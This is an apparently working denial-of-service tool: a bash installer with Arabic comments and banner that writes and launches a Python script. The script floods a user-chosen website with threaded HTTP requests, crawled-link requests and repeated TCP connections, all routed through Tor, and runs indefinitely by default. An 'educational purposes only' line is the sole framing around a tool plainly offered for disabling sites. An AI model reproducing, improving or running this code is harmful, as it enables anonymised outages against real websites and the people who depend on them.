#!/bin/bash
# أداة Rebel DDoS - لتعطيل المواقع الإلكترونية
# للأغراض التعليمية فقط - الاستخدام غير القانوني محظور
# GitHub: github.com/Anonymous-Rebels/WebDestroyer

echo -e "\e[91m
  ██████╗ ██████╗ ██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔══██╗██╔════╝
  ██║  ██║██║  ██║██║  ██║███████╗
  ██║  ██║██║  ██║██║  ██║╚════██║
  ██████╔╝██████╔╝██████╔╝███████║
  ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
   >>   أداة DDoS فائقة السرعة   <<
   >>  الإصدار: 6.0 - HTTP/HTTPS <<
\e[0m"

# التحقق من صلاحيات الروت
if [ "$EUID" -ne 0 ]; then
  echo -e "\e[91m[!] يجب تشغيل السكربت كـ root (sudo)\e[0m"
  exit 1
fi

# تثبيت المتطلبات
install_requirements() {
  echo -e "\e[92m[*] تثبيت المتطلبات...\e[0m"
  apt update -y
  apt install -y tor torsocks slowhttptest siege python3 python3-pip
  pip3 install requests[socks] beautifulsoup4
}

# إنشاء ملف الهجوم
create_attack_script() {
  cat > mega_ddos.py <<EOL
#!/usr/bin/env python3
# أداة DDoS فائقة السرعة
import os
import sys
import time
import random
import socket
import threading
import requests
from bs4 import BeautifulSoup

class MegaDDoS:
    def __init__(self, target_url, threads=1000, duration=0):
        self.target_url = target_url
        self.threads = threads
        self.duration = duration  # 0 = لا نهائي
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
            "Googlebot/2.1 (+http://www.google.com/bot.html)"
        ]
        self.proxies = {
            'http': 'socks5h://localhost:9050',
            'https': 'socks5h://localhost:9050'
        }
        self.attack_running = True
        
    def http_flood(self):
        while self.attack_running:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                requests.get(
                    self.target_url, 
                    headers=headers,
                    proxies=self.proxies,
                    timeout=5,
                    verify=False
                )
            except:
                pass
    
    def recursive_crawl(self):
        try:
            response = requests.get(
                self.target_url, 
                proxies=self.proxies,
                timeout=10,
                verify=False
            )
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                if not self.attack_running:
                    break
                try:
                    url = link['href']
                    if not url.startswith('http'):
                        url = self.target_url + url
                    requests.get(
                        url, 
                        proxies=self.proxies,
                        timeout=5,
                        verify=False
                    )
                except:
                    pass
        except:
            pass
    
    def tcp_syn_flood(self):
        target = self.target_url.split("//")[-1].split("/")[0]
        port = 80 if "http:" in self.target_url else 443
        
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
            except:
                pass
    
    def start_attack(self):
        print(f"[+] بدء الهجوم على {self.target_url}")
        print(f"[+] عدد الثريدات: {self.threads}")
        print(f"[+] المدة: {'لا نهائي' if self.duration == 0 else f'{self.duration} ثانية'}")
        
        # تشغيل Tor
        os.system("service tor start > /dev/null 2>&1")
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.http_flood)
            t.daemon = True
            threads.append(t)
            
            if i % 3 == 0:
                t = threading.Thread(target=self.recursive_crawl)
                t.daemon = True
                threads.append(t)
            
            if i % 4 == 0:
                t = threading.Thread(target=self.tcp_syn_flood)
                t.daemon = True
                threads.append(t)
        
        for t in threads:
            t.start()
        
        # تحديد مدة الهجوم
        if self.duration > 0:
            time.sleep(self.duration)
            self.attack_running = False
            print("[+] انتهى الهجوم")
        else:
            print("[+] الهجوم يعمل... اضغط Ctrl+C لإيقافه")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                self.attack_running = False
                print("[+] تم إيقاف الهجوم")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 mega_ddos.py <target_url> [threads] [duration]")
        print("Example: python3 mega_ddos.py https://example.com 1000 60")
        sys.exit(1)
    
    target_url = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    
    attacker = MegaDDoS(target_url, threads, duration)
    attacker.start_attack()
EOL

  chmod +x mega_ddos.py
}

# الواجهة الرئيسية
main_interface() {
  echo -e "\e[92m"
  read -p "أدخل رابط الموقع المستهدف (مع http/https): " target_url
  read -p "أدخل عدد الثريدات (افتراضي 1000): " threads
  threads=${threads:-1000}
  read -p "مدة الهجوم بالثواني (0 = لا نهائي): " duration
  echo -e "\e[0m"
  
  echo -e "\e[91m[+] بدء الهجوم على $target_url\e[0m"
  ./mega_ddos.py "$target_url" "$threads" "$duration"
}

# الإعدادات الرئيسية
install_requirements
create_attack_script
main_interface

echo -e "\e[91m\n[+] تم إيقاف الأداة\e[0m"
